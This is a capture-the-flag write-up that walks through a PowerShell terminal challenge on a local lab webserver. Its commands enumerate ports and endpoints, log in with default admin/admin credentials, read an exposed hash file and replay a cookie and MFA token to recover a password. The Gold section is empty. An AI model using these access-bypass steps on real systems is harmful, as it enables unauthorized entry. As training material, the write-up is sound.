# PowerShell

## Challenge Information
- **Difficulty**: 3 / 5
- **Description**: Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.

## Table of Contents
0. [Challenge Information](#challenge-information)
1. [Dialog](#dialog)
2. [Solution: Silver](#solution-silver)
3. [Solution: Gold](#solution-gold)

## Dialog
Piney Sappington:
```
> Hey there, friend! Piney Sappington here.
> You've probably heard the latest—things are getting tense around here with all the faction business between Wombley and Alabaster. But, let’s focus on this PowerShell Terminal for now.
> This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter intruders, but the system is in a faulty lockdown state.
> I certainly wasn't the one that programmed the mechanism. Nope not me. But can you help me find a way through it so I can regain access?
> There's two functions I need access to. The snow cannon terminal, which should be easier. And the snow cannon production and deployment plans. That one's better defended.
> Still, I've got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.
> So, think you can do it? Are you ready to show what you've got?
```

## Solution: Silver

To begin the series of PowerShell tasks in the terminal, simply type `y` and press Enter.

![](images/Terminal.png)

### Assignment 1

**Description**: There is a file in the current directory called 'welcome.txt'. Read the contents of this file

**Solution**: The `Get-Content` command reads the content of a file and displays it in the console. By specifying the path to `welcome.txt`, the command retrieves and outputs its data, solving the task.

**Command to run**:
```PowerShell
Get-Content -Path ./welcome.txt
```

**Response**:
```
System Overview
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.

Lockdown Protocols
When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.

Access and System Restoration
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.
```

### Assignment 2

**Description**: Geez that sounds ominous, I'm sure we can get past the defense mechanisms. 
We should warm up our PowerShell skills. 
How many words are there in the file?

**Solution**: The `Get-Content` command reads the file's contents, and `Measure-Object -Word` counts the total number of words. This combination efficiently provides the word count for the file.

**Command to run**:
```PowerShell
Get-Content -Path ./welcome.txt | Measure-Object -Word
```

**Response**:
```
Lines Words Characters Property
----- ----- ---------- --------
        180
```

### Assignment 3

**Description**: There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on? 

**Solution**: The `netstat -nao` command displays all active connections and listening ports on the machine. By reviewing the output, you can locate the port associated with the listening server.

**Command to run**:
```PowerShell
netstat -nao
```

**Response**:
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:1225          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 172.17.0.3:60994        52.179.73.39:443        ESTABLISHED off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     1015425977 /tmp/tmux-1050/default
unix  2      [ ACC ]     STREAM     LISTENING     1015660360 /tmp/dotnet-diagnostic-3873-261001791-socket
unix  2      [ ACC ]     STREAM     LISTENING     1015659428 /tmp/CoreFxPipe_PSHost.DB5DBAB0.3873.None.pwsh
unix  3      [ ]         STREAM     CONNECTED     1015427194 /tmp/tmux-1050/default
unix  3      [ ]         STREAM     CONNECTED     1015427193
```

### Assignment 4

**Description**: You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?

**Solution**: The `Invoke-WebRequest` cmdlet sends an HTTP request to the specified URL and provides the response, including the status code. This allows you to verify the server's status and response behavior.

**Command to run**:
```PowerShell
Invoke-WebRequest -uri http://localhost:1225
```

**Response**:
```
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).
```

### Assignment 5

**Description**: It looks like defensive measures are in place, it is protected by basic authentication. 
Try authenticating with a standard admin username and password.

**Solution**: The `Invoke-WebRequest` cmdlet supports passing credentials for basic authentication. By creating a `Credential` object with the admin username and password, you can send an HTTP request with authentication to access the protected resource.

**Command to run**:
```PowerShell
$username = "admin"
$password = "admin"

# Create a credential object
$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))

# Use the credential object with Invoke-WebRequest
Invoke-WebRequest http://localhost:1225 -Credential $credential -AllowUnencryptedAuthentication
```

**Response**:
```                      
StatusCode        : 200
StatusDescription : OK
Content           : <html>
                    <body>
                    <pre>
                    ----------------------------------------------------
                    🪖 Elf MFA webserver🪖
                    ⚔️ Grab your tokens for access to weaponry ⚔️
                    ⚔️ Warning! Sensitive information on the server, protect a…
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 03 Jan 2025 08:44:47 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 3475
                    
                    <html>
                    <body>
                    <pre>
                    ---…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://localhost:1225/endpoints/1">Endpoint 1</a>; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=<a href="http://localhost:1225/e
                    ndpoints/2">Endpoint 2</a>; tagName=A; href=http://localhost:1225/endpoints/2}, @{outerHTML=<a href="http://localhost:1225/endpoints/3">Endpoint 3</a>; tagName=A; href=h
                    ttp://localhost:1225/endpoints/3}, @{outerHTML=<a href="http://localhost:1225/endpoints/4">Endpoint 4</a>; tagName=A; href=http://localhost:1225/endpoints/4}…}
RawContentLength  : 3475
RelationLink      : {}
```

### Assignment 6

**Description**: There are too many endpoints here. 
Use a loop to download the contents of each page. What page has 138 words? 
When you find it, communicate with the URL and print the contents to the terminal.

**Solution**: The loop iterates through the endpoints (from 1 to 25) and retrieves the word count for each page using `Measure-Object -Word`. The page with 138 words is identified, and the corresponding URL is accessed to display its contents in the terminal.

**Command to run**:
```PowerShell
1..25 | ForEach-Object { Invoke-WebRequest http://localhost:1225/endpoints/$_ -Credential $credential -AllowUnencryptedAuthentication | measure -word }
```

**Response**:
```
Lines Words Characters Property
----- ----- ---------- --------
        130            
        127            
        162            
        156            
        162            
        147            
        165            
        159            
        159            
        142            
        150            
        123            
        138            
        134            
        132            
        115            
        132            
         89            
         67            
         58            
         57            
         61            
         62            
         49            
         51
```

Based on the output above, we can see the endpoint is number `13`.

**Command to run**:
```PowerShell
$response = Invoke-WebRequest http://localhost:1225/endpoints/13 -Credential $credential -AllowUnencryptedAuthentication; $response.Content
```

**Response**:
```HTML
<html>
   <head>
      <title>MFA token scrambler</title>
   </head>
   <body>
      <p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p>
      <p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p>
   </body>
</html>
```

### Assignment 7

**Description**: There seems to be a csv file in the comments of that page. 
 That could be valuable, read the contents of that csv-file!

**Solution**: The CSV file is retrieved using `Invoke-WebRequest`, and its contents are printed to the terminal. The file contains MD5 hashes and corresponding SHA-256 hashes. Additionally, some system logs are included, noting that sensitive endpoints are redacted and panic mode has been triggered.

**Command to run**:
```PowerShell
$request = Invoke-WebRequest http://localhost:1225/token_overview.csv -Credential $credential -AllowUnencryptedAuthentication; $request.Content
```

**Response**:
```
file_MD5hash,Sha256(file_MD5hash)                                                                                       
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

### Assignment 8

**Description**: Luckily the defense mechanisms were faulty! 
There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!

**Solution**: To resolve the issue, add the necessary cookie and then interact with the endpoint.

**Command to run**:
```PowerShell
$request = Invoke-WebRequest http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -AllowUnencryptedAuthentication; $request.Content
```

**Response**:
```HTML
<h1>[!] ERROR: Missing Cookie 'token'</h1>
```

### Assignment 9

**Description**: It looks like it requires a cookie token, set the cookie and try again.

**Solution**: Use the new cookie (`mfa_code`) and follow the provided link to validate the MFA token.

**Command to run**:
```PowerShell
$request = Invoke-WebRequest http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'='token=5f8dd236f862f4507835b0e418907ffc'}; $request.Content
```

**Response**:
```HTML
<h1>Cookie 'mfa_code', use it at <a href='1735895177.2982268'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
```

### Assignment 10

**Description**: Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!

**Solution**: You need to validate the MFA token using the given endpoint. First, send a request to validate the token, passing the correct cookie and token.

**Command to run**:
```PowerShell
$request = Invoke-WebRequest http://localhost:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C$ -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'='token=5f8dd236f862f4507835b0e418907ffc; mfa_token=1732143590.373717'}; $request.Content
```

**Response**:
```HTML
<h1>[!] System currently in lock down</h1><br><h1>[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons</h1>
```

**Command to run**:
```PowerShell
$mfa = (Invoke-WebRequest http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'='token=5f8dd236f862f4507835b0e418907ffc'}).Links.href

$request = Invoke-WebRequest http://localhost:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=5f8dd236f862f4507835b0e418907ffc; mfa_token=$($mfa)"}; $request.Content
```

**Response**:
```HTML
<h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p>
```

### Assignment 11

**Description**: That looks like base64! Decode it so we can get the final secret!

**Solution**: The given base64 string contains a message. You can decode it to retrieve the final secret.

**Command to run**:
```PowerShell
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String("Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="))
```

**Response**:
```
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
```

## Solution: Gold